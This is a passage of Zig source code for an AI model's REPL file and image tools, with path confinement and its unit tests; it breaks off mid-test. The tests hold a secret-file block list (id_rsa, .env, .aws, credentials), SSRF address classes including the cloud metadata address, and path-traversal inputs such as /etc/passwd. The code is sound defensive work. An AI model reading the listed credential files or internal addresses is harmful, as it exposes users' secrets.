    const edited = try replaceMatches(a, data, old_string, new_string, replace_all);
    defer a.free(edited);
    if (edited.len > max_write_bytes)
        return textOut(a, "error: the edited file would be {d} bytes, more than the {d} bytes a file tool can hold", .{ edited.len, max_write_bytes });
    if (try replaceFileBytes(a, ctx.io, real, edited)) |msg| return .{ .text = msg };
    return textOut(a, "edited {s}: {d} replacement{s}, {d} bytes", .{ path, matches, if (matches == 1) @as([]const u8, "") else "s", edited.len });
}

/// The data-URL media type of an image the server can decode, by magic bytes.
pub fn imageMime(bytes: []const u8) ?[]const u8 {
    if (std.mem.startsWith(u8, bytes, "\x89PNG\r\n\x1a\n")) return "image/png";
    if (std.mem.startsWith(u8, bytes, "\xff\xd8\xff")) return "image/jpeg";
    if (bytes.len >= 12 and std.mem.eql(u8, bytes[0..4], "RIFF") and std.mem.eql(u8, bytes[8..12], "WEBP")) return "image/webp";
    if (std.mem.startsWith(u8, bytes, "GIF87a") or std.mem.startsWith(u8, bytes, "GIF89a")) return "image/gif";
    if (std.mem.startsWith(u8, bytes, "BM")) return "image/bmp";
    return null;
}

pub fn imageDataUrl(allocator: std.mem.Allocator, bytes: []const u8) !?[]u8 {
    const mime = imageMime(bytes) orelse return null;
    const enc = std.base64.standard.Encoder;
    const head = try std.fmt.allocPrint(allocator, "data:{s};base64,", .{mime});
    defer allocator.free(head);
    const out = try allocator.alloc(u8, head.len + enc.calcSize(bytes.len));
    @memcpy(out[0..head.len], head);
    _ = enc.encode(out[head.len..], bytes);
    return out;
}

fn imageOutput(allocator: std.mem.Allocator, bytes: []const u8, src: []const u8) !Output {
    const url = try imageDataUrl(allocator, bytes) orelse
        return textOut(allocator, "error: {s} is not a PNG, JPEG, WebP, GIF or BMP image", .{src});
    errdefer allocator.free(url);
    return .{
        .text = try std.fmt.allocPrint(allocator, "image attached: {s} ({d} KB, {s})", .{ src, (bytes.len + 1023) / 1024, imageMime(bytes).? }),
        .image = url,
    };
}

pub const ImageLoad = union(enum) { ok: []u8, refused: []const u8 };

/// A secret name anywhere on an absolute path, or a hidden file at its end.
fn userPathRefusal(path: []const u8) ?[]const u8 {
    var it = std.mem.tokenizeScalar(u8, path, '/');
    while (it.next()) |c| if (isSecretName(c)) return refuse_secret;
    const name = std.fs.path.basename(path);
    if (name.len > 0 and name[0] == '.' and !std.mem.eql(u8, name, ".") and !std.mem.eql(u8, name, "..")) return refuse_hidden;
    return null;
}

/// The real path of an absolute path the user typed: no folder to stay in, but
/// `userPathRefusal` holds, as typed and after resolution.
fn userRealPath(allocator: std.mem.Allocator, io: std.Io, path: []const u8) !Confined {
    if (userPathRefusal(path)) |msg| return .{ .refused = msg };
    const real_z = std.Io.Dir.realPathFileAbsoluteAlloc(io, path, allocator) catch |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        else => return .{ .refused = "no such file or folder" },
    };
    defer allocator.free(real_z);
    if (userPathRefusal(real_z)) |msg| return .{ .refused = msg };
    return .{ .ok = try allocator.dupe(u8, real_z) };
}

/// The user's `/image <path>` as a data URL. A relative path is confined like
/// `view_image`; an absolute or `~` path may leave the folder. `refused` is worded for the user.
pub fn loadUserImage(allocator: std.mem.Allocator, io: std.Io, root: []const u8, home: []const u8, path: []const u8) !ImageLoad {
    const target = std.mem.trim(u8, path, " \t\r\n");
    const expanded = if (std.mem.eql(u8, target, "~") or std.mem.startsWith(u8, target, "~/"))
        try std.fs.path.join(allocator, &.{ home, target[1..] })
    else
        try allocator.dupe(u8, target);
    defer allocator.free(expanded);
    const found = if (std.fs.path.isAbsolute(expanded))
        try userRealPath(allocator, io, expanded)
    else
        try confinePath(allocator, io, root, expanded);
    const real = switch (found) {
        .ok => |p| p,
        .refused => |msg| return .{ .refused = if (std.mem.eql(u8, msg, refuse_outside))
            "that path is outside the folder; /cd to its folder first"
        else if (std.mem.startsWith(u8, msg, "refused: ")) msg["refused: ".len..] else msg },
    };
    defer allocator.free(real);
    const bytes = std.Io.Dir.cwd().readFileAlloc(io, real, allocator, .limited(max_image_bytes)) catch |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        error.StreamTooLong => return .{ .refused = std.fmt.comptimePrint("the image is larger than {d} MB", .{max_image_bytes / (1024 * 1024)}) },
        else => return .{ .refused = "cannot read it" },
    };
    defer allocator.free(bytes);
    return .{ .ok = try imageDataUrl(allocator, bytes) orelse return .{ .refused = "not a PNG, JPEG, WebP, GIF or BMP image" } };
}

fn viewImage(ctx: Context, src: []const u8) !Output {
    const a = ctx.allocator;
    if (!ctx.vision) return textOut(a, "error: this model cannot see images", .{});
    if (hasHttpScheme(src) or std.mem.indexOf(u8, src, "://") != null) {
        const got = try webGet(ctx, src, max_image_bytes);
        const page = switch (got) {
            .fail => |f| return .{ .text = f },
            .page => |p| p,
        };
        defer page.deinit(a);
        if (page.truncated) return textOut(a, "error: the image at {s} is larger than {d} MB", .{ src, max_image_bytes / (1024 * 1024) });
        return imageOutput(a, page.body, src);
    }
    const real = switch (try confinePath(a, ctx.io, ctx.root, src)) {
        .refused => |msg| return textOut(a, "{s}", .{msg}),
        .ok => |p| p,
    };
    defer a.free(real);
    const bytes = std.Io.Dir.cwd().readFileAlloc(ctx.io, real, a, .limited(max_image_bytes)) catch |err| switch (err) {
        error.StreamTooLong => return textOut(a, "error: {s} is larger than {d} MB", .{ src, max_image_bytes / (1024 * 1024) }),
        error.OutOfMemory => return error.OutOfMemory,
        else => return textOut(a, "error: cannot read {s} ({t})", .{ src, err }),
    };
    defer a.free(bytes);
    return imageOutput(a, bytes, src);
}

// ── Tests ───────────────────────────────────────────────────────────────

const testing = std.testing;

test "repl tools: the SSRF classifier refuses every non-public address" {
    const Case = struct { ip: []const u8, class: HostClass };
    for ([_]Case{
        .{ .ip = "8.8.8.8", .class = .public },
        .{ .ip = "140.82.112.3", .class = .public },
        .{ .ip = "127.0.0.1", .class = .loopback },
        .{ .ip = "127.8.9.10", .class = .loopback },
        .{ .ip = "10.1.2.3", .class = .private },
        .{ .ip = "172.16.0.1", .class = .private },
        .{ .ip = "172.31.255.255", .class = .private },
        .{ .ip = "172.32.0.1", .class = .public },
        .{ .ip = "192.168.1.1", .class = .private },
        .{ .ip = "169.254.169.254", .class = .link_local },
        .{ .ip = "100.64.0.1", .class = .cgnat },
        .{ .ip = "100.127.255.254", .class = .cgnat },
        .{ .ip = "100.128.0.1", .class = .public },
        .{ .ip = "224.0.0.251", .class = .multicast },
        .{ .ip = "0.0.0.0", .class = .unspecified },
        .{ .ip = "255.255.255.255", .class = .reserved },
        .{ .ip = "198.18.0.1", .class = .reserved },
        .{ .ip = "::1", .class = .loopback },
        .{ .ip = "::", .class = .unspecified },
        .{ .ip = "fe80::1", .class = .link_local },
        .{ .ip = "fd12:3456::1", .class = .private },
        .{ .ip = "ff02::fb", .class = .multicast },
        .{ .ip = "::ffff:127.0.0.1", .class = .loopback },
        .{ .ip = "::ffff:10.0.0.1", .class = .private },
        .{ .ip = "64:ff9b::a9fe:a9fe", .class = .link_local },
        .{ .ip = "2606:4700::1111", .class = .public },
    }) |c| {
        const addr = try std.Io.net.IpAddress.parse(c.ip, 0);
        const got = switch (addr) {
            .ip4 => |a| classifyIp4(a.bytes),
            .ip6 => |a| classifyIp6(a.bytes),
        };
        testing.expectEqual(c.class, got) catch |err| {
            std.debug.print("{s}\n", .{c.ip});
            return err;
        };
    }
    for ([_][]const u8{ "localhost", "LOCALHOST.", "api.localhost", "printer.local", "nas.LOCAL.", "db.internal", "router.home.arpa" }) |h|
        try testing.expect(hostNameRefused(h));
    for ([_][]const u8{ "ziglang.org", "local.example.com", "localhost.example.com", "html.duckduckgo.com" }) |h|
        try testing.expect(!hostNameRefused(h));
}

test "repl tools: secret names are refused by pattern" {
    for ([_][]const u8{ ".env", ".env.local", "server.pem", "TLS.KEY", "id_rsa", "id_ed25519.pub", "cert.p12", "credentials", "credentials.json", "login.keychain-db", ".ssh", ".aws", ".gnupg" }) |n| {
        testing.expect(isSecretName(n)) catch |err| {
            std.debug.print("{s}\n", .{n});
            return err;
        };
    }
    for ([_][]const u8{ "README.md", "main.zig", "keys.txt", "monkey.png", "environment.md", "pemfile.txt" }) |n|
        try testing.expect(!isSecretName(n));
}

test "repl tools: file paths are confined to the starting folder" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(io, "proj/sub");
    try tmp.dir.createDirPath(io, "proj/.git");
    try tmp.dir.createDirPath(io, "outside");
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/notes.txt", .data = "hi\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/sub/a.txt", .data = "a\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/.env", .data = "KEY=1\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/.git/config", .data = "[core]\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/server.pem", .data = "pem\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "outside/secret.txt", .data = "s\n" });
    try tmp.dir.symLink(io, "../outside/secret.txt", "proj/escape.txt", .{});
    try tmp.dir.symLink(io, "../outside", "proj/escape_dir", .{});
    try tmp.dir.symLink(io, ".env", "proj/plain_name", .{});
    try tmp.dir.symLink(io, "notes.txt", "proj/inside_link.txt", .{});

    const root = try tmp.dir.realPathFileAlloc(io, "proj", allocator);
    defer allocator.free(root);

    const Case = struct { path: []const u8, ok: bool };
    const outside_abs = try std.fmt.allocPrint(allocator, "{s}/../outside/secret.txt", .{root});
    defer allocator.free(outside_abs);
    const inside_abs = try std.fmt.allocPrint(allocator, "{s}/sub/a.txt", .{root});
    defer allocator.free(inside_abs);
    for ([_]Case{
        .{ .path = "notes.txt", .ok = true },
        .{ .path = "./sub/a.txt", .ok = true },
        .{ .path = "sub", .ok = true },
        .{ .path = "", .ok = true },
        .{ .path = ".", .ok = true },
        .{ .path = inside_abs, .ok = true },
        .{ .path = "inside_link.txt", .ok = true },
        .{ .path = "../outside/secret.txt", .ok = false },
        .{ .path = "sub/../../outside/secret.txt", .ok = false },
        .{ .path = outside_abs, .ok = false },
        .{ .path = "/etc/passwd", .ok = false },
        .{ .path = "escape.txt", .ok = false },
        .{ .path = "escape_dir/secret.txt", .ok = false },
        .{ .path = "plain_name", .ok = false },
        .{ .path = ".env", .ok = false },
        .{ .path = ".git/config", .ok = false },
        .{ .path = "server.pem", .ok = false },
        .{ .path = "missing.txt", .ok = false },
    }) |c| {
        const got = try confinePath(allocator, io, root, c.path);
        switch (got) {
            .ok => |p| {
                defer allocator.free(p);
                testing.expect(c.ok) catch |err| {
                    std.debug.print("allowed: {s} -> {s}\n", .{ c.path, p });
                    return err;
                };
                try testing.expect(std.mem.startsWith(u8, p, root));
            },
            .refused => |msg| {
                testing.expect(!c.ok) catch |err| {
                    std.debug.print("refused: {s}: {s}\n", .{ c.path, msg });
                    return err;
                };
                try testing.expect(msg.len > 0 and msg.len < 200);
            },
        }
    }
}

test "repl tools: the DuckDuckGo parser reads titles, unwrapped urls and snippets, skipping ads" {
    const allocator = testing.allocator;
    const results = try parseDdgResults(allocator, @embedFile("fixtures/ddg_results.html"));
    defer freeSearchResults(allocator, results);
    try testing.expectEqual(@as(usize, 3), results.len);
    try testing.expectEqualStrings("Download & Releases \u{2014} Zig Programming Language", results[0].title);
    try testing.expectEqualStrings("https://ziglang.org/download/", results[0].url);
    try testing.expectEqualStrings("Release notes and tarballs for every Zig version, \"master\" builds included.", results[0].snippet);
    try testing.expectEqualStrings("Releases \u{00B7} ziglang/zig", results[1].title);
    try testing.expectEqualStrings("https://github.com/ziglang/zig/releases", results[1].url);
    try testing.expectEqualStrings("General-purpose programming language and toolchain.", results[1].snippet);
    try testing.expectEqualStrings("https://en.wikipedia.org/wiki/Zig_(programming_language)?a=1&b=2", results[2].url);
    try testing.expectEqualStrings("", results[2].snippet);

    const none = try parseDdgResults(allocator, "<html><body><div class=\"no-results\">No results.</div></body></html>");
    defer freeSearchResults(allocator, none);
    try testing.expectEqual(@as(usize, 0), none.len);
}

test "repl tools: HTML reduces to readable text with headings, lists and resolved links" {
    const allocator = testing.allocator;
    const text = try htmlToText(allocator, @embedFile("fixtures/article.html"), "https://example.org/notes/", 20_000);
    defer allocator.free(text);
    try testing.expectEqualStrings(
        \\# Release Notes — Example
        \\
        \\# Release Notes
        \\
        \\The latest release is 0.15.1. See the download page (https://example.org/download/) or https://example.org/changelog.
        \\
        \\## Changes
        \\
        \\- Faster builds
        \\- Fewer bugs & more tests
        \\
        \\zig build
        \\  -Doptimize=ReleaseFast
        \\
        \\Café ☺ ☃ done.
    , text);

    const cut = try htmlToText(allocator, "<p>" ++ "abcdefghij" ++ "abcdefghij" ++ "abcdefghij" ++ "</p>", null, 25);
    defer allocator.free(cut);
    try testing.expectEqualStrings("abcdefghijabcdefghijabcde\n[truncated]", cut);
}

test "repl tools: a DuckDuckGo bot check reads as blocked, not as zero results" {
    try testing.expect(ddgBlocked("<div class=\"anomaly-modal__modal\">Unfortunately, bots use DuckDuckGo too.</div>"));
    try testing.expect(!ddgBlocked(@embedFile("fixtures/ddg_results.html")));
}

fn expectStartsWith(prefix: []const u8, s: []const u8) !void {
    testing.expect(std.mem.startsWith(u8, s, prefix)) catch |err| {
        std.debug.print("expected prefix '{s}' in:\n{s}\n", .{ prefix, s });
        return err;
    };
}

fn expectContains(needle: []const u8, s: []const u8, want: bool) !void {
    testing.expect((std.mem.indexOf(u8, s, needle) != null) == want) catch |err| {
        std.debug.print("expected '{s}' {s} in:\n{s}\n", .{ needle, if (want) "present" else "absent", s });
        return err;
    };
}

fn runForTest(ctx: Context, name: []const u8, args: []const u8) ![]u8 {
    const out = try run(ctx, name, args);
    if (out.image) |img| testing.allocator.free(img);
    return out.text;
}

fn entryExists(dir: std.Io.Dir, io: std.Io, sub: []const u8) bool {
    dir.access(io, sub, .{ .read = true }) catch return false;
    return true;
}

test "repl tools: file tools read, list and grep inside the folder only" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(io, "sub");
    try tmp.dir.createDirPath(io, ".git");
    try tmp.dir.writeFile(io, .{ .sub_path = "notes.txt", .data = "hello world\nsecond line\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "sub/code.zig", .data = "const x = 1; // hello\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = ".env", .data = "hello=secret\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = ".git/HEAD", .data = "hello ref\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "server.key", .data = "hello key\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "bin.dat", .data = "hello\x00\x01\x02" });
    try tmp.dir.writeFile(io, .{ .sub_path = "pic.png", .data = "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR" });
    const big = try allocator.alloc(u8, max_read_bytes + 1000);
    defer allocator.free(big);
    @memset(big, 'a');
    try tmp.dir.writeFile(io, .{ .sub_path = "big.txt", .data = big });
    const root = try tmp.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(root);
    const ctx: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = true };

    const Case = struct { name: []const u8, args: []const u8, prefix: []const u8 = "", has: []const []const u8 = &.{}, lacks: []const []const u8 = &.{} };
    for ([_]Case{
        .{ .name = "read_file", .args = "{\"path\":\"notes.txt\"}", .prefix = "hello world\nsecond line\n" },
        .{ .name = "read_file", .args = "{\"path\":\".env\"}", .prefix = "refused:" },
        .{ .name = "read_file", .args = "{\"path\":\"server.key\"}", .prefix = "refused:" },
        .{ .name = "read_file", .args = "{\"path\":\"../notes.txt\"}", .prefix = "refused:" },
        .{ .name = "read_file", .args = "{\"path\":\"/etc/hosts\"}", .prefix = "refused:" },
        .{ .name = "read_file", .args = "{\"path\":\"bin.dat\"}", .prefix = "error: bin.dat is not a text file" },
        .{ .name = "read_file", .args = "{\"path\":\"sub\"}", .prefix = "error: sub is a folder" },
        .{ .name = "read_file", .args = "{\"path\":\"big.txt\"}", .prefix = "aaaa", .has = &.{"\n[truncated: showing the first 262144 bytes of 263144]"} },
        .{ .name = "read_file", .args = "{}", .prefix = "error: read_file needs a \"path\" string" },
        .{ .name = "list_dir", .args = "{}", .has = &.{ "notes.txt", "sub/", "pic.png" }, .lacks = &.{ ".env", ".git", "server.key" } },
        .{ .name = "list_dir", .args = "{\"path\":\"sub\"}", .has = &.{"code.zig"} },
        .{ .name = "list_dir", .args = "{\"path\":\".git\"}", .prefix = "refused:" },
        .{ .name = "search_files", .args = "{\"pattern\":\"hello\"}", .has = &.{ "notes.txt:1: hello world", "sub/code.zig:1: const x = 1; // hello" }, .lacks = &.{ ".env", ".git", "server.key", "bin.dat" } },
        .{ .name = "search_files", .args = "{\"pattern\":\"sec.nd\",\"path\":\".\"}", .has = &.{"notes.txt:2: second line"} },
        .{ .name = "search_files", .args = "{\"pattern\":\"nowhere-to-be-found\"}", .prefix = "no matches" },
        .{ .name = "view_image", .args = "{\"path_or_url\":\"notes.txt\"}", .prefix = "error: notes.txt is not a PNG, JPEG, WebP, GIF or BMP image" },
        .{ .name = "no_such_tool", .args = "{}", .prefix = "error: unknown tool no_such_tool" },
        .{ .name = "read_file", .args = "{not json", .prefix = "error: the arguments are not a JSON object" },
    }) |c| {
        const text = try runForTest(ctx, c.name, c.args);
        defer allocator.free(text);
        try expectStartsWith(c.prefix, text);
        for (c.has) |h| try expectContains(h, text, true);
        for (c.lacks) |h| try expectContains(h, text, false);
    }

    const seen = try run(ctx, "view_image", "{\"path_or_url\":\"pic.png\"}");
    defer seen.deinit(allocator);
    try expectStartsWith("data:image/png;base64,iVBORw0KGgo", seen.image.?);
    try expectStartsWith("image attached", seen.text);

    const blind: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = false };
    const refused = try run(blind, "view_image", "{\"path_or_url\":\"pic.png\"}");
    defer refused.deinit(allocator);
    try testing.expect(refused.image == null);
    try expectStartsWith("error: this model cannot see images", refused.text);
}

test "repl tools: a path outside the folder tells the model the user can move it with /cd" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(io, "proj");
    try tmp.dir.writeFile(io, .{ .sub_path = "outside.txt", .data = "o\n" });
    const root = try tmp.dir.realPathFileAlloc(io, "proj", allocator);
    defer allocator.free(root);
    const ctx: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = true };
    for ([_][2][]const u8{
        .{ "read_file", "{\"path\":\"../outside.txt\"}" },
        .{ "read_file", "{\"path\":\"/etc/hosts\"}" },
        .{ "list_dir", "{\"path\":\"/\"}" },
        .{ "search_files", "{\"pattern\":\"o\",\"path\":\"..\"}" },
        .{ "view_image", "{\"path_or_url\":\"/tmp/shot.png\"}" },
    }) |c| {
        const text = try runForTest(ctx, c[0], c[1]);
        defer allocator.free(text);
        try expectStartsWith("refused:", text);
        try expectContains("/cd <folder>", text, true);
    }
}

test "repl tools: /cd resolves a folder by real path and refuses anything else" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(io, "home/proj/sub");
    try tmp.dir.createDirPath(io, "home/.ssh");
    try tmp.dir.createDirPath(io, "other");
    try tmp.dir.writeFile(io, .{ .sub_path = "home/proj/notes.txt", .data = "hi\n" });
    try tmp.dir.symLink(io, "../../other", "home/proj/to_other", .{});
    const base = try tmp.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(base);
    const home = try std.fmt.allocPrint(allocator, "{s}/home", .{base});
    defer allocator.free(home);
    const proj = try std.fmt.allocPrint(allocator, "{s}/home/proj", .{base});
    defer allocator.free(proj);
    const other = try std.fmt.allocPrint(allocator, "{s}/other", .{base});
    defer allocator.free(other);
    const sub = try std.fmt.allocPrint(allocator, "{s}/home/proj/sub", .{base});
    defer allocator.free(sub);

    const Case = struct { arg: []const u8, want: ?[]const u8 };
    for ([_]Case{
        .{ .arg = "sub", .want = sub },
        .{ .arg = "./sub/", .want = sub },
        .{ .arg = "..", .want = home },
        .{ .arg = "~", .want = home },
        .{ .arg = "~/proj/sub", .want = sub },
        .{ .arg = other, .want = other },
        .{ .arg = "to_other", .want = other },
        .{ .arg = "notes.txt", .want = null },
        .{ .arg = "missing", .want = null },
        .{ .arg = "~/.ssh", .want = null },
    }) |c| {
        switch (try changeRoot(allocator, io, proj, home, c.arg)) {
            .ok => |got| {
                defer allocator.free(got);
                testing.expectEqualStrings(c.want orelse "(refused)", got) catch |err| {
                    std.debug.print("/cd {s}\n", .{c.arg});
                    return err;
                };
            },
            .refused => |msg| {
                testing.expect(c.want == null and msg.len > 0) catch |err| {
                    std.debug.print("/cd {s} refused: {s}\n", .{ c.arg, msg });
                    return err;
                };
            },
        }
    }
}

/// A folder with one subfolder, text files, a binary file, a hidden file, a secret-named
/// file, and two symlinks that leave the folder.
fn writeFixture(tmp: *testing.TmpDir, allocator: std.mem.Allocator) ![:0]u8 {
    const io = testing.io;
    try tmp.dir.createDirPath(io, "proj/sub");
    try tmp.dir.createDirPath(io, "elsewhere");
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/notes.txt", .data = "alpha\nbeta\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/twice.txt", .data = "x\nx\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/bin.dat", .data = "a\x00b\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/.hidden.txt", .data = "keep\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/server.key", .data = "keep\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "elsewhere/outside.txt", .data = "keep\n" });
    try tmp.dir.symLink(io, "../elsewhere/outside.txt", "proj/link.txt", .{});
    try tmp.dir.symLink(io, "../elsewhere", "proj/dirlink", .{});
    return tmp.dir.realPathFileAlloc(io, "proj", allocator);
}

test "repl tools: write_file and edit_file change files inside the folder only" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try writeFixture(&tmp, allocator);
    defer allocator.free(root);
    const big = try allocator.alloc(u8, max_write_bytes + 1);
    defer allocator.free(big);
    @memset(big, 'a');
    const big_write = try std.fmt.allocPrint(allocator, "{{\"path\":\"big.txt\",\"content\":\"{s}\"}}", .{big});
    defer allocator.free(big_write);
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/huge.txt", .data = big });
    const abs_inside = try std.fmt.allocPrint(allocator, "{{\"path\":\"{s}/abs.md\",\"content\":\"abs\\n\"}}", .{root});
    defer allocator.free(abs_inside);
    const abs_outside = try std.fmt.allocPrint(allocator, "{{\"path\":\"{s}/../elsewhere/evil.txt\",\"content\":\"evil\\n\"}}", .{root});
    defer allocator.free(abs_outside);

    var ctx: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = false, .writable = true };
    const Case = struct { name: []const u8, args: []const u8, prefix: []const u8 = "", has: []const []const u8 = &.{}, lacks: []const []const u8 = &.{} };
    for ([_]Case{
        .{ .name = "write_file", .args = "{\"path\":\"todo.md\",\"content\":\"buy fish\\n\"}", .prefix = "wrote 9 bytes to todo.md" },
        .{ .name = "read_file", .args = "{\"path\":\"todo.md\"}", .prefix = "buy fish\n" },
        .{ .name = "write_file", .args = "{\"path\":\"notes.txt\",\"content\":\"alpha\\ngamma\\n\"}", .prefix = "wrote 12 bytes to notes.txt" },
        .{ .name = "write_file", .args = "{\"path\":\"sub/nested.md\",\"content\":\"n\\n\"}", .prefix = "wrote 2 bytes to sub/nested.md" },
        .{ .name = "write_file", .args = abs_inside, .prefix = "wrote 4 bytes to" },
        .{ .name = "write_file", .args = "{\"path\":\"../elsewhere/evil.txt\",\"content\":\"evil\\n\"}", .prefix = "refused:", .has = &.{"/cd <folder>"} },
        .{ .name = "write_file", .args = abs_outside, .prefix = "refused:" },
        .{ .name = "write_file", .args = "{\"path\":\".secret.md\",\"content\":\"x\\n\"}", .prefix = "refused:", .has = &.{"hidden"} },
        .{ .name = "write_file", .args = "{\"path\":\"server.key\",\"content\":\"x\\n\"}", .prefix = "refused:", .has = &.{"secrets"} },
        .{ .name = "write_file", .args = "{\"path\":\"link.txt\",\"content\":\"x\\n\"}", .prefix = "refused:" },
        .{ .name = "write_file", .args = "{\"path\":\"dirlink/esc.txt\",\"content\":\"x\\n\"}", .prefix = "refused:" },
        .{ .name = "write_file", .args = "{\"path\":\"sub\",\"content\":\"x\\n\"}", .prefix = "error:", .has = &.{"is a folder"} },
        .{ .name = "write_file", .args = "{\"path\":\"nodir/f.md\",\"content\":\"x\\n\"}", .prefix = "refused:", .has = &.{"does not exist"} },
        .{ .name = "write_file", .args = "{\"path\":\"bin.dat\",\"content\":\"x\\n\"}", .prefix = "refused:", .has = &.{"not a text file"} },
        .{ .name = "write_file", .args = "{\"path\":\"notes.txt\"}", .prefix = "error: write_file needs" },
        .{ .name = "write_file", .args = "{\"path\":\"p.md\"}", .prefix = "error: write_file needs" },
        .{ .name = "write_file", .args = big_write, .prefix = "error:", .has = &.{"bytes"} },
        .{ .name = "edit_file", .args = "{\"path\":\"notes.txt\",\"old_string\":\"gamma\",\"new_string\":\"omega\"}", .prefix = "edited notes.txt: 1 replacement, 12 bytes" },
        .{ .name = "edit_file", .args = "{\"path\":\"twice.txt\",\"old_string\":\"x\",\"new_string\":\"y\"}", .prefix = "refused:", .has = &.{ "2 matches", "replace_all" } },
        .{ .name = "edit_file", .args = "{\"path\":\"twice.txt\",\"old_string\":\"x\",\"new_string\":\"y\",\"replace_all\":true}", .prefix = "edited twice.txt: 2 replacements, 4 bytes" },
        .{ .name = "edit_file", .args = "{\"path\":\"missing.md\",\"old_string\":\"a\",\"new_string\":\"b\"}", .prefix = "error:", .has = &.{"no such file"} },
        .{ .name = "edit_file", .args = "{\"path\":\"notes.txt\",\"old_string\":\"zulu\",\"new_string\":\"b\"}", .prefix = "error:", .has = &.{"no match"} },
        .{ .name = "edit_file", .args = "{\"path\":\"notes.txt\",\"old_string\":\"\",\"new_string\":\"b\"}", .prefix = "error:" },
        .{ .name = "edit_file", .args = "{\"path\":\"../elsewhere/outside.txt\",\"old_string\":\"keep\",\"new_string\":\"gone\"}", .prefix = "refused:" },
        .{ .name = "edit_file", .args = "{\"path\":\"huge.txt\",\"old_string\":\"aaa\",\"new_string\":\"b\"}", .prefix = "error:", .has = &.{"too large"} },
        .{ .name = "edit_file", .args = "{\"path\":\"notes.txt\",\"old_string\":\"alpha\"}", .prefix = "error: edit_file needs" },
    }) |c| {
        const text = try runForTest(ctx, c.name, c.args);
        defer allocator.free(text);
        try expectStartsWith(c.prefix, text);
        for (c.has) |h| try expectContains(h, text, true);
        for (c.lacks) |h| try expectContains(h, text, false);
    }

    const Kept = struct { path: []const u8, want: []const u8 };
    for ([_]Kept{
        .{ .path = "proj/todo.md", .want = "buy fish\n" },
        .{ .path = "proj/notes.txt", .want = "alpha\nomega\n" },
        .{ .path = "proj/twice.txt", .want = "y\ny\n" },
        .{ .path = "proj/sub/nested.md", .want = "n\n" },
        .{ .path = "elsewhere/outside.txt", .want = "keep\n" },
        .{ .path = "proj/.hidden.txt", .want = "keep\n" },
        .{ .path = "proj/server.key", .want = "keep\n" },
    }) |k| {
        const got = try tmp.dir.readFileAlloc(io, k.path, allocator, .limited(4096));
        defer allocator.free(got);
        try testing.expectEqualStrings(k.want, got);
    }
    // Every write went through a temp file; none of them may be left behind.
    var proj = try tmp.dir.openDir(io, "proj", .{ .iterate = true });
    defer proj.close(io);
    var entries: usize = 0;
    var it = proj.iterate();
    while (try it.next(io)) |_| entries += 1;
    try testing.expectEqual(@as(usize, 11), entries);

    ctx.writable = false;
    for ([_][]const u8{ "write_file", "edit_file" }) |name| {
        const args = if (std.mem.eql(u8, name, "write_file"))
            "{\"path\":\"late.md\",\"content\":\"x\\n\"}"
        else
            "{\"path\":\"notes.txt\",\"old_string\":\"omega\",\"new_string\":\"x\"}";
        const text = try runForTest(ctx, name, args);
        defer allocator.free(text);
        try expectStartsWith("refused:", text);
        try expectContains("/edit on", text, true);
        try testing.expect(!entryExists(tmp.dir, io, "proj/late.md"));
    }
    try testing.expectEqual(@as(?usize, null), std.mem.indexOf(u8, definitionsJson(false, false), "write_file"));
    try testing.expectEqual(@as(?usize, null), std.mem.indexOf(u8, definitionsJson(true, false), "write_file"));
    try testing.expect(std.mem.indexOf(u8, definitionsJson(false, true), "edit_file") != null);
    try testing.expect(std.mem.indexOf(u8, definitionsJson(true, true), "view_image") != null);
    try testing.expectEqualStrings("web_search, fetch_url, read_file, list_dir, search_files", toolNames(false, false));
    try testing.expect(std.mem.endsWith(u8, toolNames(true, true), "view_image, write_file, edit_file"));
}

test "repl tools: confineNewPath answers for a name that does not exist yet" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try writeFixture(&tmp, allocator);
    defer allocator.free(root);
    const real_root = try std.mem.concat(allocator, u8, &.{ root, "/sub/next.md" });
    defer allocator.free(real_root);
    const abs_new = try std.mem.concat(allocator, u8, &.{ root, "/abs.md" });
    defer allocator.free(abs_new);
    const abs_up = try std.mem.concat(allocator, u8, &.{ root, "/../elsewhere/away.md" });
    defer allocator.free(abs_up);

    const Case = struct { path: []const u8, want: ?[]u8 };
    for ([_]Case{
        .{ .path = "new.md", .want = try std.mem.concat(allocator, u8, &.{ root, "/new.md" }) },
        .{ .path = "sub/next.md", .want = try allocator.dupe(u8, real_root) },
